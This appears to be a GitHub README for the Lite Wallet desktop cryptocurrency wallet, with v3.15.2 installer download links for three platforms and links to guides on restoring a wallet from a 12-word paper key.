![Lite Wallet](assets/banner-profile.png)

<h1 align="center">Lite Wallet</h1>

<p align="center">A wiped phone is not a lost wallet, as long as twelve words survived it.</p>

<a href="#license"><img src="https://img.shields.io/badge/LICENSE-MIT-2578D1?style=for-the-badge&labelColor=001116" alt="License: MIT"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2"><img src="https://img.shields.io/badge/RELEASE-v3.15.2-2578D1?style=for-the-badge&labelColor=001116" alt="Release v3.15.2"></a> <a href="#downloads"><img src="https://img.shields.io/badge/PLATFORMS-WINDOWS%20%7C%20MACOS%20%7C%20LINUX-2578D1?style=for-the-badge&labelColor=001116" alt="Platforms: Windows, macOS, Linux"></a>

---

## Downloads - v3.15.2

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

Every checksum is published on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

---

## Why Lite Wallet

The worst recovery story is never the theft. It is the phone that was replaced, the laptop
that went to repair, the drive that failed, and the twelve words that were never written
down because the app was working fine. Nothing about a wallet makes that moment less final:
there is no reset link and no support desk with a copy.

The good version of the same story is short. Twelve words, in the right order, and the
wallet is back on new hardware in minutes, with the same addresses and the same balance once
the sync catches up. Everything the recovery guides do is aimed at making that second story
the one that happens. A backup kept on the same disk as the wallet is not a backup at all.

- The paper key is shown once and can be re-read behind device authentication, so write it early.
- A restore that shows zero is usually still syncing, not empty; the guides say how to tell.
- A rejected word is a spelling problem, not a lost wallet, and there is a fix for it.
- Hardware wallets change who holds the key, not whether a backup exists.

This repository is one page of the Lite Wallet project on GitHub; the recovery guides carry the restore sequence itself.

## Guides

<div align="center">

| Guide | What it covers |
| --- | --- |
| [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | How the 12-word paper key appears, how to record it once, and how to bring a wallet back from it. |
| [The paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) | The restore sequence step by step, the rejected-word fix and the zero balance that often follows a restore. |
| [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) | Why a sync stalls, loops or restarts, and the order of fixes that actually moves the progress bar. |
| [The seed portability guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-seed-in-another-wallet.md) | Bring the same 12 words into Electrum-LTC or another wallet, and why a derivation path changes what appears. |

</div>

The restore sequence and every related fix are indexed in the recovery repository, which links back to the setup index.

**Twelve words are the whole credential: no support message, form or pop-up has a reason to ask for them.**

## Support

Questions go to the issue tracker, where the answers stay public and searchable. The tracker is at [the issue page](https://github.com/litewallet-dev/litewallet-desktop/issues).

## License

MIT.

---

Wallet source and releases: [the desktop repository](https://github.com/litewallet-dev/litewallet-desktop). All guides: [the setup repository](https://github.com/litewallet-dev/litecoin-wallet-setup).
